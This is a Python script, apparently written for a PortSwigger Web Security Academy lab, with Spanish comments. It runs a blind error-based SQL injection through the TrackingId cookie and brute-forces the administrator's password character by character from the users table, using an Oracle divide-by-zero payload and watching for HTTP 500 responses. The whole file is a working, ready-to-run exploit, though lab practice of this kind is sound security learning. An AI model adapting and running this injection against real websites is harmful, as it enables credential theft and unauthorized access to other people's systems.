#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

# vars
MAIN_URL="https://0a3c007803934ffa80770dad00ca00b5.web-security-academy.net"
CHARS=string.ascii_lowercase + string.digits

# functions
def def_handler(sig, frame):
    print("\nSaliendo...")
    sys.exit(1)

def make_req():
    password=""
    p1=log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)
    p2=log.progress("Password")
    # p3=log.progress("Text")
    for i in range(1, 21):
        for char in CHARS:
            cookies = {
                "TrackingId": "a3NDRi5at5NWv6DF'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i, char), 
                "session": "BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv"
            }

            try:
                p1.status(cookies["TrackingId"])
                r=requests.get(MAIN_URL, cookies=cookies)
                time.sleep(1)
                # p3.status(r.text)
                if r.status_code == 500:
                    password+=char
                    p2.status(password)
                    #print("Password:", password)
                    break
            
            except Exception as e:
                print("Error:", e)
                sys.exit(1)
    
    p1.success("Password encontrado: %s" % password)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# main
if __name__ == "__main__":
    make_req()
    # time.sleep(10)